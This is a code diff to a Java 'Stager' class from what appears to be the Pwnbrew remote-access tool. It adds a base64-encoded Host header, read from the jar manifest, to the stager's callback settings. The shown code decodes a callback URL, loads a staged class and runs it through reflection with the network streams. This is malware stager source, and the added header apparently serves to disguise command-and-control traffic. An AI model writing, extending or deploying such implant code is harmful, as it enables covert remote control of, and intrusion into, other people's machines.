@@ -77,6 +77,7 @@ public class Stager extends ClassLoader {
     public static final String SLEEP_LABEL = "JVM-ID";
     public static final String CERT_SERIAL_LABEL = "CRT-ID";
     public static final String URL = "Private";
+    public static final String HOST_HEADER = "HDR";
     public static final String STAG_PROP_FILE ="META-INF/MANIFEST.MF";
     
     /**
@@ -115,6 +116,15 @@ public class Stager extends ClassLoader {
 
                     //Create sleep timer
                     SleepTimer aTimer = new SleepTimer(decodedURL);
+                    
+                    //Get the Host header
+                    String hostHeaderEnc = localProperties.getProperty(HOST_HEADER, null);
+                    String decodedHdr = null;
+                    if (hostHeaderEnc != null){
+                        aDecoder = new sun.misc.BASE64Decoder();
+                        decodedHdr = new String( aDecoder.decodeBuffer(hostHeaderEnc) ).trim();
+                        aTimer.setHostHeader(decodedHdr);
+                    }
 
                     //Get sleep time if it exists
                     String sleepTime = localProperties.getProperty(SLEEP_LABEL, null);
@@ -157,7 +167,7 @@ public class Stager extends ClassLoader {
                         String certSerial = localProperties.getProperty(CERT_SERIAL_LABEL, null);
                         
                         Stager theStager = new Stager();
-                        theStager.start(theIS, theOS, decodedURL, certSerial );
+                        theStager.start(theIS, theOS, decodedURL, certSerial, decodedHdr );
 
                     } else {
                         uninstall();
@@ -318,7 +328,7 @@ public class Stager extends ClassLoader {
      * @param paramOutputStream
      * @param passedURL
      */
-    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, String certSerial ) {
+    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, String certSerial, String hostHdr ) {
         
         try {
             
@@ -380,7 +390,7 @@ public class Stager extends ClassLoader {
                         //Start staged class
                         if( localClass != null ){
                             Object pwnbrewStage = localClass.newInstance();
-                            String[] theObjArr = new String[]{passedURL, certSerial};
+                            String[] theObjArr = new String[]{passedURL, certSerial, hostHdr};
                         
                             Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                             aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
